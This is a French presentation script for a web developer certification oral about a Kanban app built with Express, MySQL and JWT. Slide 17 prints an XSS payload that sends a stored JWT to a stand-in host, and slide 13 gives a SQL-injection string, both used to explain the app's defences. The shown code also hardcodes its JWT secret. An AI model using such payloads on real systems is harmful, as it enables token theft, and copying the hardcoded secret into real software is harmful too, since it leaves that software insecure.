# SCRIPT DE PRÉSENTATION — LUMINA PRO
## À utiliser comme guide pour ton oral DWWM
## (Chaque section = 1 slide de ta présentation)

---

## SLIDE 1 — TITRE

**Titre affiché :**
> PRÉSENTATION DU PROJET LUMINA PRO
> Application de gestion de tâches Kanban

**Présenté par :**
> Syrine Ben Hassine
> DWWM · La Plateforme_ · 2025

**Ce que tu dis à l'oral :**
"Bonjour, je m'appelle Syrine Ben Hassine, je suis candidate au titre professionnel de Développeuse Web et Web Mobile. Je vais vous présenter mon projet Lumina Pro, une application de gestion de tâches basée sur la méthode Kanban."

---

## SLIDE 2 — SOMMAIRE

**Liste des sections à afficher :**
1. Présentation
2. La genèse
3. Cahier des charges
4. Technologies utilisées
5. MCD / MLD
6. Base de données
7. Tables
8. Relations / Clés étrangères
9. MPD
10. Authentification JWT
11. Sécurité
12. API REST
13. Kanban
14. Réalisations personnelles
15. Swagger
16. Responsive
17. Point de difficulté
18. Conclusion

---

## SLIDE 3 — PRÉSENTATION DU PROJET

**Titre de la slide :** PRÉSENTATION

**Contenu à afficher :**
- Nom : Syrine Ben Hassine
- Formation : DWWM — Développeuse Web et Web Mobile
- École : La Plateforme_ — Promotion 2024/2025
- Projet : Lumina Pro — Application Kanban

**Chiffres clés du projet :**
- 5 tables en base de données
- 13 endpoints API REST
- 8 modules JavaScript frontend

**Technologies utilisées :**
Node.js — Express — MySQL — HTML5 — CSS3 — JavaScript — JWT — bcrypt — Swagger

**Ce que tu dis à l'oral :**
"Lumina Pro est une application web de gestion de tâches collaborative. Elle permet à une équipe de visualiser, créer et déplacer des tâches dans un tableau Kanban, avec un système d'authentification sécurisé par JWT."

---

## SLIDE 4 — LA GENÈSE

**Titre de la slide :** LA GENÈSE

**Contenu à afficher :**
> Pourquoi Lumina Pro ?

"Les équipes ont besoin d'un outil simple et visuel pour organiser leur travail, sans la complexité de solutions comme Jira."

**Fonctionnalités :**
- Tableau Kanban avec colonnes personnalisables
- Gestion des tâches (créer, modifier, déplacer, supprimer)
- Authentification JWT + bcrypt
- Gestion d'équipe avec rôles admin/utilisateur
- Système de logs pour l'audit des actions
- Interface responsive mobile
- Documentation API Swagger

**2 types d'utilisateurs :**
- 👑 ADMIN : gère les colonnes, les utilisateurs, toutes les tâches
- 👤 UTILISATEUR : crée et déplace des tâches

---

## SLIDE 5 — CAHIER DES CHARGES

**Titre de la slide :** CAHIER DES CHARGES

**À gauche — User Stories / MVP :**

*En tant qu'utilisateur :*
- Je veux me connecter de façon sécurisée
- Je veux voir le kanban de l'équipe
- Je veux créer et assigner des tâches
- Je veux déplacer une tâche entre colonnes
- Je veux modifier ou supprimer mes tâches

*En tant qu'admin :*
- Je veux gérer les colonnes du kanban
- Je veux voir et supprimer les membres
- Je veux voir les logs d'activité

**À droite — Liste des routes API :**
| Méthode | Route | Protection |
|---------|-------|-----------|
| GET | /api/tasks | JWT requis |
| POST | /api/tasks | JWT requis |
| PUT | /api/tasks/:id | JWT requis |
| DELETE | /api/tasks/:id | JWT requis |
| POST | /api/auth/login | Public |
| POST | /api/auth/register | Public |
| GET | /api/users | JWT requis |

---

## SLIDE 6 — TECHNOLOGIES UTILISÉES

**Titre de la slide :** TECHNOLOGIES UTILISÉES

**FRONT-END :**
- HTML5 sémantique
- CSS3 modulaire (8 fichiers séparés)
- Flexbox et Media Queries
- JavaScript ES6+ (Vanilla, sans framework)
- Fetch API + async/await
- localStorage pour le token JWT

**BACK-END :**
- Node.js (runtime JavaScript côté serveur)
- Express 5 (framework HTTP)
- mysql2 (driver pour MySQL)
- jsonwebtoken (génération et vérification JWT)
- bcrypt (hachage des mots de passe)
- cors (autorisation des origines)

**BASE DE DONNÉES :**
- MySQL 8 (SGBDR relationnel)
- 5 tables liées par clés étrangères
- Requêtes préparées (protection injection SQL)
- ON DELETE CASCADE et SET NULL

**OUTILS :**
- Swagger UI (documentation API)
- Postman (test des routes)
- Git + GitHub (versioning)
- XAMPP (serveur local)

---

## SLIDE 7 — MCD / MLD

**Titre de la slide :** MCD / MLD

**Modèle Conceptuel des Données :**

```
[USERS] ──────────────── 1,N ──── [TASKS] ──── 1,1 ──── [COLUMNS]
  id (PK)          assigne          id (PK)    appartient    id (PK)
  name                              title                    title
  email (UNIQUE)                    description              position
  password (hash)                   priority (ENUM)
  role (ENUM)                       id_assigned (FK → users)
  created_at                        id_col (FK → columns)
                                    created_at
```

**Cardinalités :**
- 1 colonne contient 0 à N tâches (CASCADE)
- 1 utilisateur peut avoir 0 à N tâches assignées (SET NULL)
- 1 tâche appartient à exactement 1 colonne

**Tables auxiliaires :**
- `logs` : audit de toutes les actions (qui a fait quoi et quand)
- `notifications` : alertes pour les utilisateurs

**Ce que tu dis à l'oral :**
"J'ai conçu 5 tables. La table `tasks` est au centre avec deux clés étrangères : `id_col` qui pointe vers la colonne, et `id_assigned` qui pointe vers l'utilisateur assigné. J'ai choisi CASCADE pour les colonnes — si on supprime une colonne, toutes ses tâches disparaissent. Et SET NULL pour les utilisateurs — si on supprime un membre, ses tâches restent non assignées."

---

## SLIDE 8 — BASE DE DONNÉES

**Titre de la slide :** BASE DE DONNÉES

**À montrer — code de création automatique dans server.js :**

```sql
-- Création automatique des tables au démarrage du serveur
-- IF NOT EXISTS = ne recrée pas si elles existent déjà

CREATE TABLE IF NOT EXISTS users (
  id       INT AUTO_INCREMENT PRIMARY KEY,  -- identifiant unique auto
  name     VARCHAR(100) NOT NULL,           -- nom obligatoire
  email    VARCHAR(150) UNIQUE NOT NULL,    -- email unique (pas de doublons)
  password VARCHAR(255) NOT NULL,           -- mot de passe haché par bcrypt
  role     ENUM('admin','user') DEFAULT 'user', -- rôle limité aux 2 valeurs
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP -- date auto à l'insertion
);
```

**Ce que tu dis à l'oral :**
"Au démarrage du serveur, Express vérifie si les tables existent et les crée automatiquement si ce n'est pas le cas. J'utilise `IF NOT EXISTS` pour que le script soit idempotent — on peut relancer le serveur sans risquer d'écraser les données."

---

## SLIDE 9 — TABLES DÉTAILLÉES

**Titre de la slide :** TABLES

**Table users :**
| Colonne | Type | Contrainte |
|---------|------|-----------|
| id | INT | PRIMARY KEY, AUTO_INCREMENT |
| name | VARCHAR(100) | NOT NULL |
| email | VARCHAR(150) | UNIQUE, NOT NULL |
| password | VARCHAR(255) | NOT NULL (stocké en hash bcrypt) |
| role | ENUM | 'admin' ou 'user' |
| created_at | TIMESTAMP | DEFAULT CURRENT_TIMESTAMP |

**Table tasks :**
| Colonne | Type | Contrainte |
|---------|------|-----------|
| id | INT | PRIMARY KEY, AUTO_INCREMENT |
| title | VARCHAR(255) | NOT NULL |
| description | TEXT | nullable |
| priority | ENUM | 'high', 'medium', 'low' |
| id_assigned | INT | FOREIGN KEY → users(id) |
| id_col | INT | FOREIGN KEY → columns(id) |
| created_at | TIMESTAMP | DEFAULT CURRENT_TIMESTAMP |

---

## SLIDE 10 — RELATIONS / CLÉS ÉTRANGÈRES

**Titre de la slide :** RELATIONS

**Code à afficher :**
```sql
-- Supprimer un utilisateur → les tâches restent (id_assigned = NULL)
FOREIGN KEY (id_assigned) REFERENCES users(id) ON DELETE SET NULL

-- Supprimer une colonne → toutes ses tâches sont supprimées
FOREIGN KEY (id_col) REFERENCES columns(id) ON DELETE CASCADE
```

**Explication de chaque comportement :**

- **ON DELETE CASCADE** : si on supprime la colonne "À faire", MySQL supprime automatiquement toutes les tâches de cette colonne. Pas besoin d'écrire du code pour ça.
- **ON DELETE SET NULL** : si on supprime un utilisateur, ses tâches restent dans le kanban mais `id_assigned` passe à NULL. Elles deviennent "non assignées".

**Pourquoi LEFT JOIN et pas INNER JOIN :**
"J'utilise LEFT JOIN dans la requête GET /api/tasks pour récupérer TOUTES les tâches, même celles qui n'ont pas d'utilisateur assigné (id_assigned = NULL). Avec INNER JOIN, ces tâches disparaîtraient de l'affichage."

---

## SLIDE 11 — MPD

**Titre de la slide :** MPD (Modèle Physique des Données)

**Schéma à dessiner (5 tables avec leurs colonnes et les flèches FK) :**

```
┌─────────────────┐          ┌─────────────────────────┐          ┌──────────────┐
│     USERS       │          │         TASKS            │          │   COLUMNS    │
├─────────────────┤          ├─────────────────────────┤          ├──────────────┤
│ 🔑 id INT PK AI │ ←─────── │ 🔗 id_assigned INT FK   │          │ 🔑 id PK AI  │
│ name VARCHAR    │  0..N    │ 🔑 id INT PK AI          │ ──────→  │ title        │
│ email UNIQUE    │          │ title VARCHAR            │  N..1    │ position INT │
│ password VARCHAR│          │ description TEXT         │          └──────────────┘
│ role ENUM       │          │ priority ENUM            │
│ created_at      │          │ 🔗 id_col INT FK         │
└─────────────────┘          │ created_at               │
                             └─────────────────────────┘

┌─────────────────┐          ┌─────────────────────────┐
│      LOGS       │          │     NOTIFICATIONS       │
├─────────────────┤          ├─────────────────────────┤
│ 🔑 id PK AI     │          │ 🔑 id PK AI              │
│ action VARCHAR  │          │ message TEXT             │
│ performed_by INT│          │ user_id INT              │
│ created_at      │          │ is_read BOOLEAN          │
└─────────────────┘          └─────────────────────────┘
```

---

## SLIDE 12 — AUTHENTIFICATION JWT

**Titre de la slide :** AUTHENTIFICATION JWT

**Flux de connexion à afficher :**
```
Formulaire  →  POST /login  →  bcrypt.compare()  →  jwt.sign()  →  localStorage  →  index.html
```

**Code à montrer :**
```javascript
// backend/routes/auth.js — Génération du token JWT
// jwt.sign() crée un token signé avec la clé secrète
const token = jwt.sign(
    { id: user.id, role: user.role }, // payload : données non sensibles
    'lumina_secret',                   // clé secrète pour signer
    { expiresIn: '24h' }               // expiration après 24 heures
);

// Le token est envoyé au frontend
// Le frontend le stocke dans localStorage
localStorage.setItem('token', data.token);
```

**Structure du JWT (3 parties séparées par des points) :**
- **Header** : `eyJhbGciOiJIUzI1NiJ9` → algorithme (HS256)
- **Payload** : `eyJpZCI6MX0` → données (`{ id: 1, role: "admin" }`) — visible mais non modifiable
- **Signature** : `SflKxwRJ...` → calculée avec la clé secrète — toute modification détectée

**Ce que tu dis à l'oral :**
"J'utilise JWT pour l'authentification sans état. Le serveur n'a pas besoin de stocker les sessions en base de données. Chaque requête protégée envoie le token dans le header Authorization, et le middleware verifyToken vérifie la signature à chaque fois."

---

## SLIDE 13 — SÉCURITÉ

**Titre de la slide :** SÉCURITÉ

**4 protections à expliquer :**

**1. SQL Injection → Requêtes préparées**
```javascript
// Le ? est un placeholder — mysql2 échappe automatiquement la valeur
db.query("SELECT * FROM users WHERE email = ?", [email]);
// Si email = "' OR '1'='1" → traité comme texte, pas comme code SQL
```

**2. XSS → escapeHTML()**
```javascript
// Convertit les caractères dangereux en entités HTML
escapeHTML("<script>alert('XSS')</script>")
// → "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;"
// Affiché comme texte, jamais exécuté
```

**3. Mots de passe → bcrypt (10 rounds)**
```javascript
// Hachage irréversible + sel aléatoire
const hash = await bcrypt.hash(password, 10);
// → "$2b$10$N9qo8uLOickgx2ZMRZoMye..."
// Impossible de retrouver le mot de passe original
```

**4. CSRF → JWT dans header**
- Le token est dans localStorage, pas dans un cookie
- Les cookies sont envoyés automatiquement → vulnérables au CSRF
- localStorage nécessite du code JS pour être lu → un site malveillant ne peut pas l'accéder

---

## SLIDE 14 — API REST

**Titre de la slide :** API REST

**Architecture Express (server.js) :**
```javascript
const app = express();
app.use(cors());          // autorise les requêtes cross-origin (port différent)
app.use(express.json());  // permet de lire le body des requêtes POST/PUT

// Routes publiques — pas besoin d'être connecté
app.use('/api/auth', require('./routes/auth'));

// Routes protégées — verifyToken vérifie le JWT avant d'accéder
app.use('/api/tasks',   verifyToken, require('./routes/tasks'));
app.use('/api/columns', verifyToken, require('./routes/columns'));
app.use('/api/users',   verifyToken, require('./routes/users'));
```

**Requête SQL dynamique (le plus complexe) :**
```javascript
// PUT /api/tasks/:id — modifie uniquement les champs envoyés
let sql = "UPDATE tasks SET ";
const params = [];

// On ajoute un champ au SET seulement s'il est présent dans la requête
if (title !== undefined)  { sql += "title = ?, ";   params.push(title); }
if (id_col !== undefined) { sql += "id_col = ?, ";  params.push(id_col); }

// slice(0,-2) supprime la dernière virgule avant WHERE
sql = sql.slice(0, -2) + " WHERE id = ?";
params.push(id);
```

---

## SLIDE 15 — KANBAN

**Titre de la slide :** KANBAN

**Code de génération du tableau (renderBoard) :**
```javascript
// frontend/js/kanban.js
function renderBoard(columns, tasks) {
    board.innerHTML = columns.map(col => {   // pour chaque colonne...
        
        // .filter() = on garde seulement les tâches de cette colonne
        const colTasks = tasks.filter(t => t.id_col === col.id);
        
        // On retourne le HTML de la colonne avec ses tâches
        return `<div class="kanban-column">
            <h3>${escapeHTML(col.title)}</h3>         <!-- titre échappé XSS -->
            <span>${colTasks.length}</span>            <!-- nombre de tâches -->
            ${colTasks.map(t => renderTask(t)).join('')} <!-- HTML des tâches -->
        </div>`;
        
    }).join(''); // .join('') colle les chaînes HTML ensemble
}
```

**Ce que tu dis à l'oral :**
"Le kanban est généré dynamiquement en JavaScript. Je fais deux requêtes API : une pour les colonnes, une pour toutes les tâches. Ensuite, `.filter()` distribue les tâches dans les bonnes colonnes, `.map()` les convertit en HTML, et `.join('')` les assemble."

---

## SLIDE 16 — RÉALISATION PERSONNELLE — authFetch

**Titre de la slide :** RÉALISATION PERSONNELLE

**Sous-titre :** authFetch() — Wrapper d'authentification

**Code à montrer :**
```javascript
// frontend/js/api.js
// authFetch remplace fetch() pour toutes les requêtes protégées
async function authFetch(url, options = {}) {
    // On lit le token stocké lors de la connexion
    const token = localStorage.getItem('token');

    // On ajoute automatiquement les headers nécessaires
    options.headers = {
        'Content-Type': 'application/json',   // le body est du JSON
        'Authorization': `Bearer ${token}`,   // le JWT pour s'authentifier
        ...options.headers                     // headers supplémentaires éventuels
    };

    const response = await fetch(url, options);

    // Si le token est expiré → on nettoie et on redirige vers la page de login
    if (response.status === 401) {
        localStorage.clear();
        window.location.href = 'login.html';
    }
    return response;
}
```

**Pourquoi c'est important (principe DRY) :**
"Sans authFetch(), il faudrait écrire l'en-tête Authorization dans chaque appel fetch — c'est de la duplication. Avec authFetch(), si le format du token change, on ne le modifie qu'à un seul endroit."

---

## SLIDE 17 — RÉALISATION PERSONNELLE — escapeHTML

**Titre de la slide :** RÉALISATION PERSONNELLE

**Sous-titre :** escapeHTML() — Protection XSS

**Code à montrer :**
```javascript
// frontend/js/api.js
function escapeHTML(str) {
    if (!str) return ''; // si null ou undefined → retourne vide
    return str.toString()
        .replace(/&/g,  "&amp;")  // & → &amp; (doit être en premier)
        .replace(/</g,  "&lt;")   // < → &lt;  (empêche les balises HTML)
        .replace(/>/g,  "&gt;")   // > → &gt;  (empêche les balises HTML)
        .replace(/"/g,  "&quot;") // " → &quot; (empêche la fermeture d'attribut)
        .replace(/'/g,  "&#39;"); // ' → &#39; (empêche la fermeture d'attribut)
}
```

**Exemple concret :**
- Attaque tentée : `<script>document.location='http://pirate.com?c='+localStorage.getItem('token')</script>`
- Sans escapeHTML : ce script vole le token JWT de tous les visiteurs
- Avec escapeHTML : affiché comme du texte brut, totalement inoffensif

---

## SLIDE 18 — SWAGGER

**Titre de la slide :** SWAGGER

**Contenu :**
- URL : http://localhost:3000/api-docs
- Documentation API interactive générée depuis swagger.json
- Permet de tester toutes les routes sans Postman
- Standard OpenAPI

**Capture d'écran à montrer :** L'interface Swagger de ton projet

**Ce que tu dis à l'oral :**
"J'ai intégré Swagger UI pour documenter l'API. Accessible sur /api-docs, il liste tous les endpoints avec leurs paramètres et réponses attendues. Ça permet à l'équipe front de tester l'API directement depuis le navigateur, et c'est aussi utile pour moi pour vérifier mes routes lors du développement."

---

## SLIDE 19 — RESPONSIVE

**Titre de la slide :** RESPONSIVE

**Desktop :**
- Sidebar fixe à gauche (260px)
- Colonnes kanban côte à côte
- En-tête avec profil visible

**Mobile (< 900px) :**
- Sidebar masquée (transform: translateX(-100%))
- Bouton hamburger ☰ visible
- Clic → sidebar s'ouvre (classe CSS `.open` ajoutée via JS)
- Colonnes en scroll horizontal

**Code CSS à montrer :**
```css
/* css/responsive.css */
@media (max-width: 900px) {
    /* Sur mobile, la sidebar est cachée à gauche */
    .sidebar {
        transform: translateX(-100%); /* déplace hors de l'écran */
        transition: transform 0.3s ease; /* animation fluide */
    }
    
    /* Quand on clique sur le hamburger, la classe .open est ajoutée */
    .sidebar.open {
        transform: translateX(0); /* revient à sa position normale */
    }
    
    /* Le bouton hamburger est caché sur desktop, visible sur mobile */
    .sidebar-toggle {
        display: block;
    }
}
```

---

## SLIDE 20 — JWT (CODE DU MIDDLEWARE)

**Titre de la slide :** SÉCURITÉ JWT

**Code verifyToken commenté :**
```javascript
// backend/middleware/security.js
function verifyToken(req, res, next) {
    // 1. On lit le header Authorization de la requête
    const authHeader = req.headers['authorization'];

    // 2. Si absent ou mal formaté → 401 (non authentifié)
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Token manquant' });
        // return = arrêt immédiat, sinon la suite s'exécuterait quand même
    }

    // 3. On extrait le token (tout après "Bearer ")
    const token = authHeader.split(' ')[1];

    try {
        // 4. jwt.verify() vérifie la signature ET l'expiration
        const decoded = jwt.verify(token, 'lumina_secret');
        
        // 5. On attache les infos décodées à la requête
        req.user = decoded; // { id: 1, role: 'admin', exp: ... }
        
        next(); // 6. Passer à la route suivante
        
    } catch (err) {
        // Token expiré ou falsifié → 403 (authentifié mais interdit)
        return res.status(403).json({ error: 'Token invalide ou expiré' });
    }
}
```

---

## SLIDE 21 — BCRYPT

**Titre de la slide :** BCRYPT

**Code à l'inscription :**
```javascript
// backend/routes/auth.js — Inscription
// 10 = nombre de rounds (2^10 = 1024 itérations de l'algorithme)
const hash = await bcrypt.hash(password, 10);
// Résultat : "$2b$10$N9qo8uLO..." (72 caractères, irréversible)
// Le sel aléatoire est inclus dans le hash

// Code à la connexion
const match = await bcrypt.compare(motDePasseSaisi, hashStocke);
// 1. Extrait le sel du hash stocké
// 2. Hache le mot de passe saisi avec ce même sel
// 3. Compare les deux résultats → true ou false
```

**Différence hachage vs chiffrement :**
| | Hachage (bcrypt) | Chiffrement (AES) |
|--|--|--|
| Réversible | ❌ NON | ✅ OUI (avec clé) |
| Usage | Mots de passe | Données à transmettre |

---

## SLIDE 22 — LOGS D'AUDIT

**Titre de la slide :** LOGS D'AUDIT

**Code à montrer :**
```javascript
// Après chaque action (créer tâche, supprimer colonne, etc.)
// On insère une ligne dans la table logs
const logSql = "INSERT INTO logs (action, performed_by) VALUES (?, ?)";
req.db.query(logSql, [
    `Tâche créée : ${title}`,  // description de l'action
    req.user.id                 // qui l'a faite (récupéré depuis le JWT)
]);
```

**Exemple de données dans la table :**
| id | action | performed_by | created_at |
|----|--------|-------------|-----------|
| 1 | Tâche créée : Fix bug login | 1 | 2025-06-09 10:32 |
| 2 | Colonne supprimée : Archive | 1 | 2025-06-09 14:15 |

**Pourquoi les logs sont importants :**
- Traçabilité pour l'audit de sécurité (RGPD)
- Retrouver "qui a fait quoi et quand"
- Preuve des actions en cas de litige

---

## SLIDE 23 — POINT DE DIFFICULTÉ

**Titre de la slide :** POINT DE DIFFICULTÉ

**La difficulté :** Construire une requête SQL UPDATE flexible

**Le problème :**
Le frontend peut envoyer n'importe quelle combinaison de champs :
- `moveTask()` envoie seulement `{ id_col: 2 }` (déplacement de colonne)
- Le formulaire d'édition envoie `{ title, description, priority, id_assigned, id_col }`

Comment utiliser la même route PUT pour les deux ?

**La solution :**
```javascript
// Construction dynamique du SET SQL
let sql = "UPDATE tasks SET ";
const params = [];

// On ajoute un champ uniquement s'il est présent dans le body
if (title !== undefined)       { sql += "title = ?, ";       params.push(title); }
if (description !== undefined) { sql += "description = ?, "; params.push(description); }
if (id_col !== undefined)      { sql += "id_col = ?, ";      params.push(id_col); }

// slice(0,-2) supprime la dernière virgule inutile
// Sans ça : "UPDATE tasks SET id_col = 2, WHERE id = 5" → erreur SQL
sql = sql.slice(0, -2) + " WHERE id = ?";
params.push(id);
```

---

## SLIDE 24 — CE QUE J'AMÉLIORERAIS

**Titre de la slide :** AMÉLIORATIONS FUTURES

**Sécurité :**
- `SECRET_KEY` dans un fichier `.env` (pas en dur dans le code)
- HTTPS obligatoire en production
- Rate limiting (limite les tentatives de connexion → anti-bruteforce)
- Cookies `HttpOnly` plutôt que localStorage pour le JWT (plus sécurisé contre XSS)

**Validation :**
- Validation des données côté backend (longueur, format email, etc.)
- Vérification du rôle admin côté serveur pour `/api/users`
- Messages d'erreur plus précis

**Fonctionnalités :**
- Drag & drop natif (déplacer les tâches en glissant)
- Notifications temps réel avec WebSocket
- Docker pour le déploiement
- Tests unitaires avec Jest

---

## SLIDE 25 — CONCLUSION

**Titre de la slide :** CONCLUSION

**Bilan du projet :**

"Lumina Pro m'a permis de mettre en pratique l'ensemble des compétences du titre DWWM :

✅ **Front-end** : HTML/CSS responsive, JavaScript modulaire, Fetch API, protection XSS

✅ **Back-end** : API REST Node.js/Express, authentification JWT, hachage bcrypt

✅ **Base de données** : Conception MCD/MLD/MPD, SQL, relations, intégrité référentielle

✅ **Sécurité** : OWASP Top 10 (injection SQL, XSS, mots de passe)

✅ **Qualité** : Documentation Swagger, logs d'audit, Git versioning

Ce projet m'a donné confiance pour l'avenir dans le développement web."

---

**Derniers mots à l'oral :**
"Merci pour votre attention. Je suis disponible pour répondre à vos questions."

---

## RAPPEL DES TERMES TECHNIQUES À MAÎTRISER

En cas de question sur un terme, voici les définitions courtes :

- **JWT** = token signé pour authentifier sans session serveur
- **bcrypt** = algorithme de hachage lent et sécurisé pour les mots de passe
- **middleware** = fonction intermédiaire dans la chaîne de traitement Express
- **REST API** = API utilisant les méthodes HTTP (GET/POST/PUT/DELETE) sur des URLs
- **CORS** = politique navigateur autorisant les requêtes venant d'un autre port/domaine
- **XSS** = injection de script malveillant dans une page web
- **SQL Injection** = injection de code SQL via des formulaires non protégés
- **async/await** = syntaxe JavaScript pour gérer le code asynchrone lisiblement
- **LEFT JOIN** = jointure SQL qui garde les lignes sans correspondance (id = NULL)
- **CASCADE** = suppression automatique en chaîne via clé étrangère
- **localStorage** = stockage clé/valeur persistant dans le navigateur
- **ACID** = Atomicité, Cohérence, Isolation, Durabilité (propriétés d'une BDD)
- **OWASP** = référentiel des 10 vulnérabilités web les plus critiques
- **MCD** = Modèle Conceptuel des Données (entités + relations)
- **MLD** = Modèle Logique des Données (tables + clés)
- **MPD** = Modèle Physique des Données (types SQL réels)
